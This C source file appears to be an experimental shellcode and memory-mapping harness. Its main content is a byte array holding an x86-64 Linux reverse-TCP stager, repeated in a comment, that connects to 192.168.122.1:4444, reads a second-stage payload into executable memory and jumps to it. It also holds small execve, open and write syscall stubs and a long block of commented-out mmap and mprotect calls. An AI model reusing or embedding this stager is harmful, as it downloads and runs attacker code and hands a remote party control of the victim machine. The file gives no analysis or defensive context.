#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <string.h>

char shellcode[] = "\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31\xc9\x6a\x22\x41\x5a\x6a\x07\x5a\x0f\x05\x48\x85\xc0\x78\x51\x6a\x0a\x41\x59\x50\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x85\xc0\x78\x3b\x48\x97\x48\xb9\x02\x00\x11\x5c\xc0\xa8\x7a\x01\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x59\x48\x85\xc0\x79\x25\x49\xff\xc9\x74\x18\x57\x6a\x23\x58\x6a\x00\x6a\x05\x48\x89\xe7\x48\x31\xf6\x0f\x05\x59\x59\x5f\x48\x85\xc0\x79\xc7\x6a\x3c\x58\x6a\x01\x5f\x0f\x05\x5e\x6a\x7e\x5a\x0f\x05\x48\x85\xc0\x78\xed\xff\xe6";

//char shellcode[] = "\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31\xc9\x6a\x22\x41\x5a\x6a\x07\x5a\x0f\x05\x48\x85\xc0\x78\x51\x6a\x0a\x41\x59\x50\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x85\xc0\x78\x3b\x48\x97\x48\xb9\x02\x00\x11\x5c\xc0\xa8\x7a\x01\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x59\x48\x85\xc0\x79\x25\x49\xff\xc9\x74\x18\x57\x6a\x23\x58\x6a\x00\x6a\x05\x48\x89\xe7\x48\x31\xf6\x0f\x05\x59\x59\x5f\x48\x85\xc0\x79\xc7\x6a\x3c\x58\x6a\x01\x5f\x0f\x05\x5e\x6a\x26\x5a\x0f\x05\x48\x85\xc0\x78\xed\xff\xe6"

char execve_shellcode[] = "\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05\xC3";
char open_shellcode[] = "\x48\xC7\xC0\x02\x00\x00\x00\x0F\x05\xC3";
char write_shellcode[] = "\x48\xC7\xC0\x01\x00\x00\x00\x0F\x05\xC3";

void main() {
	
    printf("%ld\n", (long)getpid());
	//getchar();

	// char** addr = mmap(NULL, 595035, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);

	// mmap(addr, 594674, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED, 3, 0);
	// memset(addr, 0, 5211);
	// mprotect(addr, 5211, PROT_READ|PROT_EXEC);
	
	// addr += 0x92000;
	// mmap(addr, 1802240, PROT_NONE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0);
	
	// mmap(addr, 89672, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0);
	// memset(addr, 0, 89672);
	// mprotect(addr, 89672, PROT_READ);

	// addr += 0x16000;
	// mmap(addr, 1301711, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0x16000);
	
	// memset(addr, 0, 1301711);
	// mprotect(addr, 1301711, PROT_READ|PROT_EXEC);

	// addr += 0x13e000;
	// mmap(addr, 315528, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0x154000);
	// memset(addr, 0, 315528);
	// mprotect(addr, 315528, PROT_READ);
	
	// // dies here
	// addr += 0x4e000;
	// mmap(addr, 46360, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0x1a1000);
	// memset(addr, 0, 0xc000);
	// mprotect(addr, 46360, PROT_READ|PROT_WRITE);

	// addr += 0xc000;
	// mmap(addr, 39304, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0);
	// memset(addr, 0, 39304);
	
	//mmap(NULL, 4096, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7f3fe36e8000
	//getchar();

    //printf("%lx\n", (unsigned long)addr);
	//memcpy(addr, open_shellcode, sizeof(open_shellcode));

	//mprotect(addr, 4096*20, PROT_READ | PROT_WRITE | PROT_EXEC);

	// void (*jump_to)(void) = (void (*)())addr;
	// jump_to();


	// memcpy(addr2, open_shellcode, sizeof(shellcode));
	// jump_to = (void (*)())addr2;
	// jump_to();

	// memcpy(addr3, open_shellcode, sizeof(shellcode));
	// jump_to = (void (*)())addr3;
	// jump_to();
	// addr[100] = 'A';
	// printf("memory content [%lx + 42]: %c\n", (unsigned long) addr, addr[42]);
	// getchar();
	// addr[4096+100] = 'A';
	// printf("memory content [%lx + 4096 + 100]: %c\n", (unsigned long) addr, addr[4096+100]);
	// getchar();
	// addr[4096+100] = 'B';
	// printf("memory content [%lx + 4096 + 100]: %c\n", (unsigned long) addr, addr[4096+100]);
	// getchar();
	return;
}
